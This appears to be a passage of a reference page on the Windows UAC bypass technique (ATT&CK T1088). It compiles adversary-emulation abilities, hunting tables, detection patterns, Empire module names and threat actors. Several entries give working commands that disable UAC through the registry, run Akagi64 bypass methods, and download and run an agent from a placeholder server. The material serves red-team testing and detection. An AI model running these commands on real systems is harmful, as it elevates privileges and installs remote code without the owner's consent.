                                                                                          'the '
                                                                                          'directory '
                                                                                          'structure '
                                                                                          'should '
                                                                                          'exist '
                                                                                          'if '
                                                                                          'the '
                                                                                          'system '
                                                                                          'is '
                                                                                          'patched, '
                                                                                          'if '
                                                                                          'unpatched '
                                                                                          'Microsoft '
                                                                                          'Management '
                                                                                          'Console '
                                                                                          'should '
                                                                                          'launch\n',
                                                                           'executor': {'cleanup_command': 'rd '
                                                                                                           '"\\\\?\\C:\\Windows '
                                                                                                           '\\" '
                                                                                                           '/S '
                                                                                                           '/Q '
                                                                                                           '>nul '
                                                                                                           '2>nul\n'
                                                                                                           'del '
                                                                                                           '"c:\\testbypass.exe" '
                                                                                                           '>nul '
                                                                                                           '2>nul\n',
                                                                                        'command': 'mkdir '
                                                                                                   '"\\\\?\\C:\\Windows '
                                                                                                   '\\System32\\"\n'
                                                                                                   'copy '
                                                                                                   '"#{executable_binary}" '
                                                                                                   '"\\\\?\\C:\\Windows '
                                                                                                   '\\System32\\mmc.exe"\n'
                                                                                                   'mklink '
                                                                                                   'c:\\testbypass.exe '
                                                                                                   '"\\\\?\\C:\\Windows '
                                                                                                   '\\System32\\mmc.exe"\n',
                                                                                        'elevation_required': True,
                                                                                        'name': 'command_prompt'},
                                                                           'input_arguments': {'executable_binary': {'default': 'C:\\Windows\\System32\\cmd.exe',
                                                                                                                     'description': 'Binary '
                                                                                                                                    'to '
                                                                                                                                    'execute '
                                                                                                                                    'with '
                                                                                                                                    'UAC '
                                                                                                                                    'Bypass',
                                                                                                                     'type': 'path'}},
                                                                           'name': 'Bypass '
                                                                                   'UAC '
                                                                                   'by '
                                                                                   'Mocking '
                                                                                   'Trusted '
                                                                                   'Directories',
                                                                           'supported_platforms': ['windows']}],
                                                         'attack_technique': 'T1088',
                                                         'display_name': 'Bypass '
                                                                         'User '
                                                                         'Account '
                                                                         'Control'}},
 {'Mitre Stockpile - Set a registry key to allow UAC bypass': {'description': 'Set '
                                                                              'a '
                                                                              'registry '
                                                                              'key '
                                                                              'to '
                                                                              'allow '
                                                                              'UAC '
                                                                              'bypass',
                                                               'id': '665432a4-42e7-4ee1-af19-a9a8c9455d0c',
                                                               'name': 'UAC '
                                                                       'bypass '
                                                                       'registry',
                                                               'platforms': {'windows': {'psh': {'command': 'New-ItemProperty '
                                                                                                            '-Path '
                                                                                                            'HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system '
                                                                                                            '-Name '
                                                                                                            'EnableLUA '
                                                                                                            '-PropertyType '
                                                                                                            'DWord '
                                                                                                            '-Value '
                                                                                                            '0 '
                                                                                                            '-Force\n'}}},
                                                               'tactic': 'privilege-escalation',
                                                               'technique': {'attack_id': 'T1088',
                                                                             'name': 'Bypass '
                                                                                     'User '
                                                                                     'Account '
                                                                                     'Control'}}},
 {'Mitre Stockpile - Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe': {'description': 'Dll '
                                                                                               'Hijack '
                                                                                               'of '
                                                                                               'WOW64 '
                                                                                               'logger '
                                                                                               'wow64log.dll '
                                                                                               'using '
                                                                                               'Akagi.exe',
                                                                                'id': '95ad5d69-563e-477b-802b-4855bfb3be09',
                                                                                'name': 'wow64log '
                                                                                        'DLL '
                                                                                        'Hijack',
                                                                                'platforms': {'windows': {'cmd,psh': {'command': '.\\Akagi64.exe '
                                                                                                                                 '30 '
                                                                                                                                 'C:\\Windows\\System32\\cmd.exe\n',
                                                                                                                      'payloads': ['Akagi64.exe']}}},
                                                                                'tactic': 'privilege-escalation',
                                                                                'technique': {'attack_id': 'T1088',
                                                                                              'name': 'Bypass '
                                                                                                      'User '
                                                                                                      'Account '
                                                                                                      'Control'}}},
 {'Mitre Stockpile - executes the slui exe file handler hijack': {'description': 'executes '
                                                                                 'the '
                                                                                 'slui '
                                                                                 'exe '
                                                                                 'file '
                                                                                 'handler '
                                                                                 'hijack',
                                                                  'id': 'b7344901-0b02-4ead-baf6-e3f629ed545f',
                                                                  'name': 'Slui '
                                                                          'File '
                                                                          'Handler '
                                                                          'Hijack',
                                                                  'platforms': {'windows': {'psh': {'command': '.\\Akagi64.exe '
                                                                                                               '45 '
                                                                                                               'C:\\Windows\\System32\\cmd.exe\n',
                                                                                                    'payloads': ['Akagi64.exe']}}},
                                                                  'tactic': 'privilege-escalation',
                                                                  'technique': {'attack_id': 'T1088',
                                                                                'name': 'Bypass '
                                                                                        'User '
                                                                                        'Account '
                                                                                        'Control'}}},
 {'Mitre Stockpile - Bypass user account controls - medium': {'description': 'Bypass '
                                                                             'user '
                                                                             'account '
                                                                             'controls '
                                                                             '- '
                                                                             'medium',
                                                              'id': 'e3db134c-4aed-4c5a-9607-c50183c9ef9e',
                                                              'name': 'Bypass '
                                                                      'UAC '
                                                                      'Medium',
                                                              'platforms': {'windows': {'psh': {'command': '$url="#{server}/file/download"; '
                                                                                                           '$wc=New-Object '
                                                                                                           'System.Net.WebClient; '
                                                                                                           '$wc.Headers.add("platform","windows"); '
                                                                                                           '$wc.Headers.add("file","sandcat.go"); '
                                                                                                           '$data=$wc.DownloadData($url); '
                                                                                                           '$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"",""); '
                                                                                                           '[io.file]::WriteAllBytes("C:\\Users\\Public\\$name.exe",$data);\n'
                                                                                                           '$job '
                                                                                                           '= '
                                                                                                           'Start-Job '
                                                                                                           '-ScriptBlock '
                                                                                                           '{ '
                                                                                                           'Import-Module '
                                                                                                           '-Name '
                                                                                                           '.\\Bypass-UAC.ps1; '
                                                                                                           'Bypass-UAC '
                                                                                                           '-Command '
                                                                                                           '"C:\\Users\\Public\\$name.exe '
                                                                                                           '-group '
                                                                                                           '#{group}"; '
                                                                                                           '};\n'
                                                                                                           'Receive-Job '
                                                                                                           '-Job '
                                                                                                           '$job '
                                                                                                           '-Wait;\n',
                                                                                                'payloads': ['Bypass-UAC.ps1']}}},
                                                              'tactic': 'privilege-escalation',
                                                              'technique': {'attack_id': 'T1088',
                                                                            'name': 'Bypass '
                                                                                    'User '
                                                                                    'Account '
                                                                                    'Control'}}},
 {'Mitre Stockpile - UIPI bypass with uiAccess application': {'description': 'UIPI '
                                                                             'bypass '
                                                                             'with '
                                                                             'uiAccess '
                                                                             'application',
                                                              'id': 'e99cce5c-cb7e-4a6e-8a09-1609a221b90a',
                                                              'name': 'duser/osksupport '
                                                                      'DLL '
                                                                      'Hijack',
                                                              'platforms': {'windows': {'psh': {'command': '$url="#{server}/file/download";\n'
                                                                                                           '$wc=New-Object '
                                                                                                           'System.Net.WebClient;\n'
                                                                                                           '$wc.Headers.add("platform","windows");\n'
                                                                                                           '$wc.Headers.add("file","sandcat.go");\n'
                                                                                                           '$wc.Headers.add("server","#{server}");\n'
                                                                                                           '$wc.Headers.add("defaultSleep","60");\n'
                                                                                                           '$wc.Headers.add("defaultGroup","bypassed_u_bro");\n'
                                                                                                           '$data=$wc.DownloadData($url);\n'
                                                                                                           '$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");\n'
                                                                                                           '[io.file]::WriteAllBytes("C:\\Users\\Public\\$name.exe",$data);\n'
                                                                                                           '.\\Akagi64.exe '
                                                                                                           '32 '
                                                                                                           '"C:\\Users\\Public\\$name.exe '
                                                                                                           '-server '
                                                                                                           '#{server}"\n',
                                                                                                'payloads': ['Akagi64.exe']}}},
                                                              'tactic': 'privilege-escalation',
                                                              'technique': {'attack_id': 'T1088',
                                                                            'name': 'Bypass '
                                                                                    'User '
                                                                                    'Account '
                                                                                    'Control'}}},
 {'Threat Hunting Tables': {'chain_id': '100012',
                            'commandline_string': '',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'high',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1088',
                            'mitre_caption': 'bypass_uac',
                            'os': 'windows',
                            'parent_process': 'eventvwr.exe',
                            'registry_path': 'HKEY_USERS\\*\\mscfile\\shell\\open\\command',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100024',
                            'commandline_string': '',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'low',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1088',
                            'mitre_caption': 'bypass_uac',
                            'os': 'windows',
                            'parent_process': 'eventvwr.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100047',
                            'commandline_string': '',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': 'https://www.redcanary.com/blog/verclsid-exe-threat-detection/',
                            'loaded_dll': '',
                            'mitre_attack': 'T1088',
                            'mitre_caption': 'bypass_uac',
                            'os': 'windows',
                            'parent_process': 'mshta.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': 'verclsid.exe',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100096',
                            'commandline_string': '',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1088',
                            'mitre_caption': 'bypass_uac',
                            'os': 'windows',
                            'parent_process': 'winword.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': 'verclsid.exe',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100203',
                            'commandline_string': 'reg query',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'high',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1088',
                            'mitre_caption': 'bypass_uac',
                            'os': 'windows',
                            'parent_process': '*.exe',
                            'registry_path': 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\App '
                                             'Paths',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'SysmonHunter - T1088': {'description': None,
                           'level': 'high',
                           'name': 'UAC bypass',
                           'phase': 'Privilege Escalation',
                           'query': [{'reg': {'path': {'pattern': 'Software\\Classes\\mscfile\\shell\\open\\command|mscfile\\shell\\open\\command'}},
                                      'type': 'reg'},
                                     {'process': {'cmdline': {'pattern': 'Software\\Classes\\mscfile\\shell\\open\\command|mscfile\\shell\\open\\command'}},
                                      'type': 'process'},
                                     {'reg': {'path': {'pattern': '\\Software\\Microsoft\\Windows\\CurrentVersion\\App '
                                                                  'Paths\\control.exe|\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand'}},
                                      'type': 'reg'},
                                     {'process': {'cmdline': {'pattern': '\\Software\\Microsoft\\Windows\\CurrentVersion\\App '
                                                                         'Paths\\control.exe|\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand'}},
                                      'type': 'process'},
                                     {'reg': {'path': {'pattern': '\\Software\\Classes\\ms-settings\\shell\\open\\command'}},
                                      'type': 'reg'},
                                     {'process': {'cmdline': {'pattern': '\\Software\\Classes\\ms-settings\\shell\\open\\command'}},
                                      'type': 'process'},
                                     {'reg': {'path': {'pattern': '\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App '
                                                                  'Paths\\cmmgr32.exe'}},
                                      'type': 'reg'},
                                     {'process': {'cmdline': {'pattern': '\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App '
                                                                         'Paths\\cmmgr32.exe'}},
                                      'type': 'process'}]}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1088',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/privesc/ask":  '
                                                                                 '["T1088"],',
                                            'Empire Module': 'powershell/privesc/ask',
                                            'Technique': 'Bypass User Account '
                                                         'Control'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1088',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/privesc/bypassuac":  '
                                                                                 '["T1088"],',
                                            'Empire Module': 'powershell/privesc/bypassuac',
                                            'Technique': 'Bypass User Account '
                                                         'Control'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1088',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/privesc/bypassuac_eventvwr":  '
                                                                                 '["T1088"],',
                                            'Empire Module': 'powershell/privesc/bypassuac_eventvwr',
                                            'Technique': 'Bypass User Account '
                                                         'Control'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1088',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/privesc/bypassuac_wscript":  '
                                                                                 '["T1088"],',
                                            'Empire Module': 'powershell/privesc/bypassuac_wscript',
                                            'Technique': 'Bypass User Account '
                                                         'Control'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1088',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/privesc/bypassuac_env":  '
                                                                                 '["T1088"],',
                                            'Empire Module': 'powershell/privesc/bypassuac_env',
                                            'Technique': 'Bypass User Account '
                                                         'Control'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1088',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/privesc/bypassuac_fodhelper":  '
                                                                                 '["T1088"],',
                                            'Empire Module': 'powershell/privesc/bypassuac_fodhelper',
                                            'Technique': 'Bypass User Account '
                                                         'Control'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1088',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/privesc/bypassuac_sdctlbypass":  '
                                                                                 '["T1088"],',
                                            'Empire Module': 'powershell/privesc/bypassuac_sdctlbypass',
                                            'Technique': 'Bypass User Account '
                                                         'Control'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1088',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/privesc/bypassuac_tokenmanipulation":  '
                                                                                 '["T1088"],',
                                            'Empire Module': 'powershell/privesc/bypassuac_tokenmanipulation',
                                            'Technique': 'Bypass User Account '
                                                         'Control'}}]
```

# Tactics


* [Defense Evasion](../tactics/Defense-Evasion.md)

* [Privilege Escalation](../tactics/Privilege-Escalation.md)
    

# Mitigations

None

# Actors


* [Honeybee](../actors/Honeybee.md)

* [BRONZE BUTLER](../actors/BRONZE-BUTLER.md)
    
* [APT29](../actors/APT29.md)
    
* [Cobalt Group](../actors/Cobalt-Group.md)
    
* [MuddyWater](../actors/MuddyWater.md)
    
* [Threat Group-3390](../actors/Threat-Group-3390.md)
    
* [Patchwork](../actors/Patchwork.md)
    
* [APT37](../actors/APT37.md)
    
